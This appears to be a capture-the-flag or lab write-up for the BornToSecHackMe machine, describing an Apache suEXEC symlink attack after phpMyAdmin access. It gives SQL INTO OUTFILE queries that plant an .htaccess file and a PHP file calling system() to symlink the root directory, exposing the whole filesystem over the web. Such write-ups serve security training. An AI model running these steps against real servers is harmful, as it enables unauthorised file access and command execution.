# Apache suEXEC

After gaining access to phpMyAdmin, we can [exploit suEXEC](https://www.exploit-db.com/exploits/27397) by creating a .htaccess file in the /var/www/forum/templates_c directory to access the / folder via a symlink.

To write files, we will use the same exploit as in the previous task in phpMyAdmin.

## Step 1: Create a .htaccess file

Create a .htaccess file in the /var/www/forum/templates_c directory with the following content:

```shell
Options Indexes FollowSymLinks
```
The Indexes directive allows us to view the contents of a directory if there is no index file present.

Use the following SQL query:
```sql
SELECT 'Options Indexes FollowSymLinks' INTO OUTFILE '/var/www/forum/templates_c/.htaccess';
```
## Step 2: Create a symlink

Create a symlink to the / directory using the following SQL query:

```sql
SELECT '<?php system("ln -sf / /var/www/forum/templates_c/symlink.php"); ?>' INTO OUTFILE '/var/www/forum/templates_c/make_symlink.php';
```

After executing the query, we need to execute the PHP, so we're going to the following URL in the browser: `https://BornToSecHackMe/forum/templates_c/make_symlink.php`.

## Step 3: Access the / directory

After executing the symlink, we can access the / directory by visiting the following URL in the browser:` https://BornToSecHackMe/forum/templates_c/symlink.php/`. This will display the contents of the / directory and allow us to access any file.
